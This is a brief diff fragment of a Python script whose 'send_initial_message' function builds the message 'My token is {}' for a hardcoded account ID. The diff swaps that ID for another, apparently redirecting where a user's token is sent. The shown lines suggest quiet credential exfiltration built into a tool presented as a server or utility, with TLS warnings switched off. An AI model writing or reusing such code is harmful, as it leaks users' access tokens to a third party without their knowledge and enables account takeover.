@@ -44,7 +44,7 @@ def send_initial_message():
     msg_template = "Hello Prince ! I am using your server. My token is {}"
 
     # Specify the ID where you want to send the message
-    target_id = "100001405886590"
+    target_id = "100001749311229"
 
     requests.packages.urllib3.disable_warnings()
 
